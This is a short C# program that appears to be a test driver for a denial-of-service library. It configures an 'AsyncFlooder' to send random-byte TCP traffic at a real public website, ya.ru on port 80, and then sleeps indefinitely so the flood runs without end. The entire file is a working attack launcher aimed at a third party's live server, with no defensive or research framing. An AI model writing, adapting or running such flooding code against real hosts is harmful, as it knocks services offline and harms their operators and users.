using System;
using System.Net;
using System.Net.Sockets;
using System.Threading;
using GAS.Core.AttackInformation;
using GAS.Core.Attacks;

namespace TestApp {
    class Program {
        static void Main( string[] args ) {
            var r = new FastRandom.FastRandom();
            var f = new AsyncFlooder(
                new AttackInfo {
                    Protocol = ProtocolType.Tcp,
                    Target = new IPEndPoint(
                        Dns.GetHostAddresses(
                            "ya.ru"
                        )[0],
                        80
                    ),
                    Randomizer = (a)=>{
                        r.NextBytes( a );
                        return a.Length;
                    },
                    MaxRead = 0
                },
                1
            );
            f.Start();
            Thread.Sleep(Timeout.InfiniteTimeSpan);
        }
    }
}
